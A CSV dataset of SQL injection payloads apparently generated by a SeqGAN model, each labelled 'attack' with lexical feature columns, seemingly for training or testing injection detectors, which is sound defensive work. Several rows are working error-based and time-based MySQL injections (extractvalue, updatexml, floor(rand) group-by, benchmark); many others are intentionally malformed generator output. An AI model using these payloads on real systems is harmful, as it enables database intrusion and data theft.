label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1eypwl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,261,6.0,6.0,2.584962500721156,5.0,1.0,0.0,0.0,0.8333333333333334,0.16666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  ""n'  =  'luk",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,262,20.0,10.0,2.8219280948873626,4.0,1.0,8.0,7.0,0.2,0.05,0.4,0.35,2.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""ju'  =  'uxywwyuj%",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,263,229.0,34.0,3.479848803926495,57.0,32.0,107.0,33.0,0.24890829694323144,0.13973799126637554,0.4672489082969432,0.14410480349344978,2.0,2.0,0.0,0.0,1.0,2.0,0.0,20.0,1.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  ""'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,264,284.0,38.0,3.9349821108368035,99.0,35.0,109.0,41.0,0.3485915492957746,0.12323943661971831,0.38380281690140844,0.1443661971830986,2.0,4.0,0.0,0.0,2.0,3.0,0.0,20.0,2.0,2.0,5.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack," 1 AND 6055  =  ,tlsidnztv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,265,26.0,18.0,3.790767239125583,12.0,5.0,7.0,2.0,0.46153846153846156,0.19230769230769232,0.2692307692307692,0.07692307692307693,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-9740""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""owb' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'b",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,266,402.0,38.0,3.9068581595454464,122.0,82.0,151.0,47.0,0.3034825870646766,0.20398009950248755,0.3756218905472637,0.11691542288557213,2.0,2.0,1.0,0.0,0.0,3.0,0.0,27.0,0.0,0.0,10.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,1'  select and6082 by=  ctx(l_kdi,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,267,33.0,23.0,4.271370634378849,18.0,5.0,6.0,4.0,0.5454545454545454,0.15151515151515152,0.18181818181818182,0.12121212121212122,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,268,561.0,41.0,3.7808979225573713,172.0,91.0,233.0,65.0,0.3065953654188948,0.1622103386809269,0.41532976827094475,0.11586452762923351,4.0,0.0,0.0,0.0,2.0,2.0,0.0,44.0,1.0,0.0,11.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ' where from  ==   or 3074'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '  =  )select ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,269,700.0,39.0,3.8259209655244133,220.0,113.0,287.0,80.0,0.3142857142857143,0.16142857142857142,0.41,0.11428571428571428,4.0,0.0,0.0,0.0,4.0,5.0,0.0,53.0,0.0,0.0,12.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,13.0,6.0,1.0,3.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,30.0
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '0n'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,270,349.0,38.0,3.791795859983654,102.0,56.0,145.0,46.0,0.2922636103151863,0.16045845272206305,0.4154727793696275,0.1318051575931232,6.0,0.0,0.0,0.0,2.0,3.0,0.0,26.0,2.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'   )   and2131  (  =  ,=  =  ('p",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,271,34.0,13.0,2.807763576417194,4.0,5.0,16.0,9.0,0.11764705882352941,0.14705882352941177,0.47058823529411764,0.2647058823529412,2.0,0.0,0.0,0.0,0.0,3.0,0.0,3.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"%kselect where 4493  =  =  (  ,,ptl(",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,272,36.0,18.0,3.6916116417513782,15.0,4.0,10.0,7.0,0.4166666666666667,0.1111111111111111,0.2777777777777778,0.19444444444444445,0.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,1.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""ifdbbsbxb'  =  'awwzbwos",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,273,26.0,15.0,3.609496334425697,17.0,1.0,4.0,4.0,0.6538461538461539,0.038461538461538464,0.15384615384615385,0.15384615384615385,2.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1   ))   or from 4607  =  =  6913s 4607  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,274,41.0,15.0,3.1565335703883464,7.0,13.0,17.0,4.0,0.17073170731707318,0.3170731707317073,0.4146341463414634,0.0975609756097561,0.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,275,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""xwwbm c'  =  'ca'  =  'zo",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,276,243.0,34.0,3.7971064591541794,79.0,37.0,97.0,30.0,0.32510288065843623,0.1522633744855967,0.3991769547325103,0.12345679012345678,4.0,2.0,0.0,0.0,0.0,3.0,0.0,16.0,0.0,0.0,5.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-4838'   )    )    f where  2131  (  ,7562  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,277,44.0,19.0,3.222191575506678,6.0,12.0,20.0,6.0,0.13636363636363635,0.2727272727272727,0.45454545454545453,0.13636363636363635,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""=rxe(iasf'  =  'r.gy""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""  un",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,278,502.0,39.0,3.7550325778078366,158.0,66.0,210.0,68.0,0.3147410358565737,0.13147410358565736,0.41832669322709165,0.13545816733067728,2.0,4.0,0.0,0.0,3.0,4.0,0.0,41.0,0.0,2.0,9.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%)   ))    adw=  whereg by 6913  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,279,207.0,35.0,3.6422251764217752,63.0,28.0,89.0,27.0,0.30434782608695654,0.13526570048309178,0.42995169082125606,0.13043478260869565,2.0,0.0,0.0,0.0,0.0,1.0,0.0,19.0,1.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'+  (  select 'dvgy' like '' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'le'  =  'y' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||''  =  'euy' like 'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,280,403.0,38.0,3.9957678632602525,109.0,93.0,141.0,60.0,0.2704714640198511,0.23076923076923078,0.34987593052109184,0.1488833746898263,14.0,0.0,0.0,0.0,0.0,6.0,0.0,23.0,0.0,0.0,12.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,2.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""djxy'  =  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,281,223.0,32.0,3.3601272928573778,52.0,32.0,107.0,32.0,0.23318385650224216,0.14349775784753363,0.4798206278026906,0.14349775784753363,2.0,2.0,0.0,0.0,1.0,2.0,0.0,20.0,0.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-5967 or 3074xw  (  =  (  =,5978  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,282,35.0,17.0,3.4570165880026575,4.0,12.0,12.0,7.0,0.11428571428571428,0.34285714285714286,0.34285714285714286,0.2,0.0,0.0,1.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""  )   ))     )   or 1e  )p""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""xc",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,283,199.0,28.0,3.413465543796586,46.0,36.0,89.0,28.0,0.23115577889447236,0.18090452261306533,0.4472361809045226,0.1407035175879397,0.0,3.0,0.0,0.0,0.0,1.0,0.0,19.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'toyoyyl'  =  'zjb'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,284,26.0,11.0,2.9941117190410815,10.0,1.0,8.0,7.0,0.38461538461538464,0.038461538461538464,0.3076923076923077,0.2692307692307692,5.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'wwxyxugwy'  =  'zubprp",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,285,319.0,38.0,4.104466397840482,116.0,55.0,113.0,35.0,0.36363636363636365,0.1724137931034483,0.3542319749216301,0.109717868338558,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'ayn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,286,325.0,38.0,3.857741601357401,105.0,55.0,129.0,36.0,0.3230769230769231,0.16923076923076924,0.39692307692307693,0.11076923076923077,2.0,0.0,0.0,0.0,2.0,1.0,0.0,24.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""vbowyyp'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,287,214.0,33.0,3.466984676676204,53.0,32.0,99.0,30.0,0.24766355140186916,0.14953271028037382,0.46261682242990654,0.14018691588785046,2.0,2.0,0.0,0.0,1.0,2.0,0.0,18.0,0.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'is ix s.  =  u  select from  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,288,362.0,39.0,3.8330130940131113,118.0,55.0,148.0,41.0,0.3259668508287293,0.15193370165745856,0.4088397790055249,0.1132596685082873,2.0,0.0,0.0,0.0,2.0,3.0,0.0,26.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'f_g' like 'fwttw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,289,313.0,39.0,4.0744352104114965,112.0,55.0,111.0,35.0,0.35782747603833864,0.1757188498402556,0.3546325878594249,0.11182108626198083,4.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,1.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,46075305  )   and(  =  (  utl_inas,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,290,34.0,19.0,3.6741173175735664,10.0,8.0,11.0,5.0,0.29411764705882354,0.23529411764705882,0.3235294117647059,0.14705882352941177,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
